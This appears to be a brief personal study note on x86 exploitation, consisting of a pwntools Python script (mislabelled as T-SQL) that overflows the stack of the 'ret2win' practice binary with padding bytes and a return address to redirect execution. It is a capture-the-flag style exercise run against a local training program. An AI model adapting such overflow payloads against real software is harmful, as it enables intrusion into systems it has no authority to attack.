## my notes on x86 security permissions and how to approach the exploit 

 ```tsql
from pwn import *

filler_num = 8
ret2win_addr = 0x400756
payload = b'A' * 32 + b'B' * filler_num + p64(ret2win_addr)

p = process("./ret2win")
p.sendlineafter("> ", payload)
p.interactive()
 ```
